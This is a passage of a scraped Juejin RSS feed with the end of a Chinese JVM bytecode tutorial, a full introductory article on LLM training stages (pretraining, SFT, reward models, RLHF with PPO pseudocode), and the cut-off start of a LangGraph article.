<li>每条指令长度不同，偏移量表示指令在字节流中的起始位置，非连续是正常现象。</li>
</ul>
<h4 data-id="heading-26">3. 为什么用字节（byte）而不是比特（bit）存储？</h4>
<ul>
<li>计算机硬件和操作系统以字节为最小寻址单位，便于存储和读取。</li>
</ul>
<h4 data-id="heading-27">4. 常量池和字节码的关系是什么？</h4>
<ul>
<li>字节码通过常量池索引间接引用类、方法、字段、字符串等，常量池是字节码的“字典”。</li>
</ul>
<h4 data-id="heading-28">5. 如何通过 javap 追踪源码到字节码的映射？</h4>
<ul>
<li>使用 <code>javap -c -l</code> 可查看字节码与源码行号、本地变量表的对应关系，便于调试和性能分析。</li>
</ul>
<hr/>
<h3 data-id="heading-29">实战案例：从源码到字节码的全流程追踪</h3>
<p><strong>1. 编写 Java 源码</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a + b;
    }
}
</code></pre>
<p><strong>2. 编译生成 .class 文件</strong></p>
<pre><code class="hljs language-shell" lang="shell">javac Calculator.java
</code></pre>
<p><strong>3. 使用 javap 分析字节码</strong></p>
<pre><code class="hljs language-shell" lang="shell">javap -c -v Calculator
</code></pre>
<p><strong>4. 结合常量池和字节码理解执行流程</strong></p>
<ul>
<li>通过 <code>iload_1</code>、<code>iload_2</code>、<code>iadd</code>、<code>ireturn</code> 理解加法的栈式执行过程。</li>
<li>通过 <code>ldc #n</code>、<code>invokevirtual #n</code> 理解常量池引用的解码过程。</li>
</ul>
<hr/>
<h3 data-id="heading-30">总结与学习建议</h3>
<ul>
<li>JVM 的栈式架构和字节码执行机制是 Java 跨平台和高安全性的基础。</li>
<li>常量池机制极大提升了符号引用的灵活性和运行时效率。</li>
<li>掌握 <code>javap</code> 等工具，有助于源码级调试、性能分析和底层原理学习。</li>
<li>建议多结合实际代码、工具输出和官方文档，反复实践、深入理解。</li>
</ul>
<hr/>
<h3 data-id="heading-31">参考资料</h3>
<ul>
<li>《深入理解 Java 虚拟机》</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fjavase%2Fspecs%2Fjvms%2Fse17%2Fhtml%2Findex.html" target="_blank" title="https://docs.oracle.com/javase/specs/jvms/se17/html/index.html" ref="nofollow noopener noreferrer">The Java® Virtual Machine Specification</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fen%2Fjava%2Fjavase%2F17%2Fdocs%2Fspecs%2Fman%2Fjavap.html" target="_blank" title="https://docs.oracle.com/en/java/javase/17/docs/specs/man/javap.html" ref="nofollow noopener noreferrer">JDK 官方文档 - javap</a></li>
</ul>
<hr/>
<p>如需进一步探讨，欢迎留言交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大语言模型是怎么训练出来的？一篇入门指南]]></title>    <link>https://juejin.cn/post/7575112613778702370</link>    <guid>https://juejin.cn/post/7575112613778702370</guid>    <pubDate>2025-11-23T22:11:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613778702370" data-draft-id="7575162322241011712" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大语言模型是怎么训练出来的？一篇入门指南"/> <meta itemprop="keywords" content="LLM,机器学习"/> <meta itemprop="datePublished" content="2025-11-23T22:11:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大语言模型是怎么训练出来的？一篇入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T22:11:50.000Z" title="Sun Nov 23 2025 22:11:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ChatGPT、Claude这些大模型到底是怎么训练出来的？看着它们能写文章、写代码、回答问题，背后的训练过程其实也没那么神秘。今天就用最直白的方式聊聊这个流程。</p>
<h2 data-id="heading-0">整体流程长啥样</h2>
<p>大模型训练可以分成四个主要阶段，每个阶段解决不同的问题。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[海量文本数据] --&gt; B[预训练 Pre-training]
    B --&gt; C[基座模型 Base Model]
    C --&gt; D[监督微调 SFT]
    D --&gt; E[指令微调模型]
    E --&gt; F[训练奖励模型 RM]
    F --&gt; G[强化学习 RLHF]
    G --&gt; H[最终产品模型]
    
    style B fill:#667eea,color:#fff
    style D fill:#764ba2,color:#fff
    style F fill:#f093fb,color:#fff
    style G fill:#4facfe,color:#fff
</code></pre>
<p>简单来说就是：</p>
<ol>
<li>预训练 - 让模型学会"说话"</li>
<li>微调 - 教它怎么做事</li>
<li>奖励建模 - 告诉它什么是好的回答</li>
<li>强化学习 - 让它自己优化</li>
</ol>
<p>听起来挺清楚的对吧？但每个阶段都有不少门道。</p>
<h2 data-id="heading-1">第一步：预训练（Pre-training）</h2>
<p>预训练就是让模型看海量的文本，自己学习语言规律。这个阶段模型会学习词汇、语法、常识，甚至一些推理能力。</p>
<h3 data-id="heading-2">数据规模有多大？</h3>
<p>看看几个主流模型的训练数据量：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[GPT-3&lt;br/&gt;300B tokens] --&gt; B[LLaMA&lt;br/&gt;1.4T tokens]
    B --&gt; C[LLaMA 2&lt;br/&gt;2T tokens]
    C --&gt; D[LLaMA 3&lt;br/&gt;15T tokens]
    
    style A fill:#e8f4f8
    style B fill:#d1e7f0
    style C fill:#b8dae8
    style D fill:#9fcde0
</code></pre>
<p>15万亿个token是什么概念？大概相当于7500万本书。数据量越大，模型学到的知识就越丰富。</p>
<h3 data-id="heading-3">训练目标：预测下一个词</h3>
<p>预训练的核心思想很简单：给模型一句话的前半部分，让它预测下一个词是什么。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 预训练的本质</span>
input_text = <span class="hljs-string">"今天天气真"</span>
<span class="hljs-comment"># 模型要预测：好 / 差 / 冷 / 热 ...</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">next_token_prediction</span>(<span class="hljs-params">context</span>):
    <span class="hljs-comment"># 计算每个可能词的概率</span>
    probabilities = model(context)
    next_token = argmax(probabilities)
    <span class="hljs-keyword">return</span> next_token
</code></pre>
<p>通过不断预测下一个词，模型逐渐学会了语言的规律。这个过程不需要人工标注，完全是自监督学习。</p>
<h3 data-id="heading-4">训练成本</h3>
<p>预训练的成本是整个训练过程中最高的。LLaMA 3训练花了几亿人民币，用了几千张GPU跑了几个月。</p>
<h2 data-id="heading-5">第二步：监督微调（SFT）</h2>
<p>预训练完之后，模型虽然学会了语言，但还不知道怎么正确回答问题。这时候就需要微调。</p>
<h3 data-id="heading-6">微调在做什么？</h3>
<p>给模型准备一些标准的问答对，教它怎么回答各种问题。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># SFT的训练数据格式</span>
training_data = [
    {
        <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"请解释什么是机器学习"</span>,
        <span class="hljs-string">"response"</span>: <span class="hljs-string">"机器学习是一种让计算机从数据中学习模式的技术..."</span>
    },
    {
        <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"用Python写一个冒泡排序"</span>,
        <span class="hljs-string">"response"</span>: <span class="hljs-string">"def bubble_sort(arr):\n    n = len(arr)\n    ..."</span>
    }
]

<span class="hljs-comment"># 训练时的目标</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sft_loss</span>(<span class="hljs-params">model, instruction, response</span>):
    predicted = model(instruction)
    <span class="hljs-comment"># 让模型输出尽可能接近标准答案</span>
    loss = cross_entropy(predicted, response)
    <span class="hljs-keyword">return</span> loss
</code></pre>
<h3 data-id="heading-7">数据量对比</h3>
<p>预训练用了万亿级别的数据，但微调只需要几十万条高质量的问答对。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">pie title 训练数据量对比
    "预训练数据" : 99.9
    "微调数据" : 0.1
</code></pre>
<p>为什么差这么多？因为预训练学的是语言的通用能力，而微调学的是具体任务的格式。就像学会了中文，再学怎么写文章就快多了。</p>
<h3 data-id="heading-8">几个要注意的地方</h3>
<ol>
<li>
<p><strong>数据质量很重要</strong>：100条高质量数据比1000条低质量数据效果好得多。高质量意味着回答准确、完整、有结构。</p>
</li>
<li>
<p><strong>任务多样性</strong>：要覆盖问答、总结、代码、翻译各种场景，不能只训练一种任务。</p>
</li>
<li>
<p><strong>格式统一</strong>：最好有清晰的模板，比如统一用"问题+回答"的格式。</p>
</li>
</ol>
<h2 data-id="heading-9">第三步：训练奖励模型（RM）</h2>
<p>这一步是训练流程中比较巧妙的设计。</p>
<h3 data-id="heading-10">为什么需要奖励模型？</h3>
<p>同一个问题可能有多个好答案，也有很多不好的答案。怎么让模型知道哪个答案更好？</p>
<p>直接打分太主观了，所以就训练一个专门的奖励模型来评判答案的质量。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[同一个问题] --&gt; B[答案A]
    A --&gt; C[答案B]
    A --&gt; D[答案C]
    
    B --&gt; E[人类标注:&lt;br/&gt;A &gt; C &gt; B]
    C --&gt; E
    D --&gt; E
    
    E --&gt; F[训练奖励模型]
    F --&gt; G[可以给任何答案打分]
    
    style E fill:#f093fb,color:#fff
    style F fill:#667eea,color:#fff
</code></pre>
<h3 data-id="heading-11">怎么训练奖励模型？</h3>
<p>核心是收集人类的偏好数据。给标注员看两个答案，让他选哪个更好。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 奖励模型的训练</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">train_reward_model</span>(<span class="hljs-params">question, answer_a, answer_b, human_preference</span>):
    score_a = reward_model(question, answer_a)
    score_b = reward_model(question, answer_b)
    
    <span class="hljs-keyword">if</span> human_preference == <span class="hljs-string">"A"</span>:
        <span class="hljs-comment"># A应该得分更高</span>
        loss = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, score_b - score_a + margin)
    <span class="hljs-keyword">else</span>:
        loss = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, score_a - score_b + margin)
    
    <span class="hljs-keyword">return</span> loss
</code></pre>
<p>这个设计很聪明：不需要给答案打绝对分数，只需要比较相对好坏。标注起来简单多了。</p>
<h3 data-id="heading-12">人类偏好数据</h3>
<p>这部分数据量不大，一般就几万条。但质量要求很高，因为这直接决定了模型的价值观和回答风格。</p>
<h2 data-id="heading-13">第四步：强化学习（RLHF）</h2>
<p>最后一步是用强化学习来优化模型。RLHF就是"从人类反馈中强化学习"。</p>
<h3 data-id="heading-14">RLHF的核心思想</h3>
<p>让模型不断尝试生成答案，用奖励模型打分，然后调整策略，追求更高的分数。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[用户问题] --&gt; B[模型生成回答]
    B --&gt; C[奖励模型打分]
    C --&gt; D{分数高吗?}
    D --&gt;|高| E[增强这种回答方式]
    D --&gt;|低| F[抑制这种回答方式]
    E --&gt; B
    F --&gt; B
    
    style C fill:#667eea,color:#fff
    style E fill:#27ae60,color:#fff
    style F fill:#e74c3c,color:#fff
</code></pre>
<p>这个过程类似训练。回答好了就鼓励，回答不好就纠正。模型逐渐学会什么样的回答能获得高分。</p>
<h3 data-id="heading-15">PPO算法</h3>
<p>RLHF用的是PPO（近端策略优化）算法。核心思想是：每次更新策略的时候，不要改得太猛，保持稳定。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># PPO的简化版本</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">ppo_update</span>(<span class="hljs-params">model, question, old_answer, reward</span>):
    new_answer = model(question)
    
    <span class="hljs-comment"># 计算策略比值</span>
    ratio = prob(new_answer) / prob(old_answer)
    
    <span class="hljs-comment"># Clip防止变化太大</span>
    clipped_ratio = clip(ratio, <span class="hljs-number">1</span>-epsilon, <span class="hljs-number">1</span>+epsilon)
    
    <span class="hljs-comment"># 选较小的那个</span>
    loss = -<span class="hljs-built_in">min</span>(ratio * reward, clipped_ratio * reward)
    
    <span class="hljs-keyword">return</span> loss
</code></pre>
<p>Clip机制是为了防止策略突变，导致模型性能下降。</p>
<h3 data-id="heading-16">RLHF的迭代循环</h3>
<p>RLHF不是一次性的，而是持续进行的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[当前模型] --&gt; B[生成回答]
    B --&gt; C[奖励模型评分]
    C --&gt; D[PPO更新]
    D --&gt; A
    
    E[收集新的人类反馈] --&gt; F[更新奖励模型]
    F --&gt; C
    
    style A fill:#667eea,color:#fff
    style D fill:#764ba2,color:#fff
    style F fill:#f093fb,color:#fff
</code></pre>
<p>ChatGPT就是这样不断迭代优化的。用户的每个反馈最终都会用来改进模型。</p>
<h2 data-id="heading-17">数据和成本</h2>
<h2 data-id="heading-18">数据和成本</h2>
<p>训练大模型需要多少钱？看看不同规模模型的成本对比：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph 小模型7B
        A1[硬件: 8卡A100] --&gt; B1[时间: 1-2周]
        B1 --&gt; C1[成本: 几万人民币]
    end
    
    subgraph 中模型70B
        A2[硬件: 64卡A100] --&gt; B2[时间: 1-2个月]
        B2 --&gt; C2[成本: 几百万]
    end
    
    subgraph 大模型175B+
        A3[硬件: 几千卡A100] --&gt; B3[时间: 3-6个月]
        B3 --&gt; C3[成本: 数亿人民币]
    end
    
    style C1 fill:#27ae60,color:#fff
    style C2 fill:#f39c12,color:#fff
    style C3 fill:#e74c3c,color:#fff
</code></pre>
<p>LLaMA 3.1的训练成本估计在5-10亿人民币，GPT-4可能更贵。这就是为什么只有大公司才能训练顶级模型。</p>
<h3 data-id="heading-19">数据准备的挑战</h3>
<p>数据准备是最耗时的环节：</p>
<ol>
<li><strong>预训练数据</strong>：要去重、过滤低质量内容、去除有害信息</li>
<li><strong>微调数据</strong>：需要人工编写或筛选，质量控制很难</li>
<li><strong>偏好数据</strong>：标注员要理解任务，还要保持一致性</li>
</ol>
<h2 data-id="heading-20">主流模型对比</h2>
<p>现在开源和闭源的大模型越来越多，看看几个主流的：</p>









































<table><thead><tr><th>模型</th><th>参数量</th><th>训练数据</th><th>特点</th></tr></thead><tbody><tr><td>GPT-3.5</td><td>175B</td><td>未公开</td><td>最早流行的对话模型</td></tr><tr><td>GPT-4</td><td>未公开</td><td>未公开</td><td>多模态，性能最强</td></tr><tr><td>LLaMA 3</td><td>8B/70B/405B</td><td>15T tokens</td><td>开源，性能接近GPT-4</td></tr><tr><td>Claude</td><td>未公开</td><td>未公开</td><td>长上下文，安全性好</td></tr><tr><td>Qwen</td><td>7B/14B/72B</td><td>3T tokens</td><td>中文友好</td></tr></tbody></table>
<p>选择建议：</p>
<ul>
<li><strong>追求性能</strong>：GPT-4或Claude 3.5</li>
<li><strong>中文场景</strong>：Qwen或ChatGLM</li>
<li><strong>私有部署</strong>：LLaMA 3</li>
<li><strong>资源受限</strong>：7B小模型 + 微调</li>
</ul>
<h2 data-id="heading-21">几点理解</h2>
<h3 data-id="heading-22">1. 数据是核心资产</h3>
<p>预训练用了15万亿token，但微调可能只要几十万条。奖励模型的人类偏好数据更是只有几万条。</p>
<p><strong>高质量的人类反馈数据是核心竞争力。</strong> 这也是为什么大公司能保持领先的重要原因。</p>
<h3 data-id="heading-23">2. 训练是持续的过程</h3>
<p>RLHF不是训练完就结束了。ChatGPT每周都在更新，不断收集用户反馈，优化模型。</p>
<p>模型部署后的运营维护，可能比初始训练还重要。</p>
<h3 data-id="heading-24">3. 对齐是个大挑战</h3>
<p>最难的不是让AI变聪明，而是让AI的目标和人类一致。RLHF是目前最好的对齐方案，但还不完美。</p>
<p>有时候模型会过度迎合，有时候又会产生不当输出。这个平衡一直在探索。</p>
<h2 data-id="heading-25">实践建议</h2>
<p>根据不同角色，给一些实际应用的建议：</p>
<p><strong>如果你是研究者</strong>：</p>
<ul>
<li>从小模型（7B）开始实验，成本可控</li>
<li>重点研究RLHF和对齐问题，这是核心难点</li>
<li>关注DPO等新范式</li>
</ul>
<p><strong>如果你是企业</strong>：</p>
<ul>
<li>优先用API（GPT-4/Claude），成本和效果最优</li>
<li>数据敏感的话，考虑私有部署LLaMA</li>
<li>积累自己的标注数据，这是长期资产</li>
</ul>
<p><strong>如果你是开发者</strong>：</p>
<ul>
<li>学习Prompt Engineering，这是最快上手的方式</li>
<li>掌握微调技术，能解决很多定制化问题</li>
<li>了解RAG（检索增强生成），补充模型知识</li>
</ul>
<h2 data-id="heading-26">写在最后</h2>
<p>大模型训练是个系统工程，涉及数据、算法、工程、成本等多个方面。从预训练到RLHF，每个阶段都有自己的挑战。</p>
<p>现在开源模型越来越多，个人开发者也有机会参与到这个领域。无论是研究、应用还是创业，都有很多机会。</p>
<p>你在用大模型做什么项目？训练或微调过程中遇到过什么问题？对文章里的内容有什么看法？欢迎在评论区交流讨论，一起学习进步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangGraph1.0智能体开发：选择API]]></title>    <link>https://juejin.cn/post/7575457788663808052</link>    <guid>https://juejin.cn/post/7575457788663808052</guid>    <pubDate>2025-11-24T02:02:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788663808052" data-draft-id="7575412016405364746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangGraph1.0智能体开发：选择API"/> <meta itemprop="keywords" content="LangChain,Agent,Python"/> <meta itemprop="datePublished" content="2025-11-24T02:02:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FreeCode"/> <meta itemprop="url" content="https://juejin.cn/user/1282499717900794"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangGraph1.0智能体开发：选择API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1282499717900794/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FreeCode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:02:03.000Z" title="Mon Nov 24 2025 02:02:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom 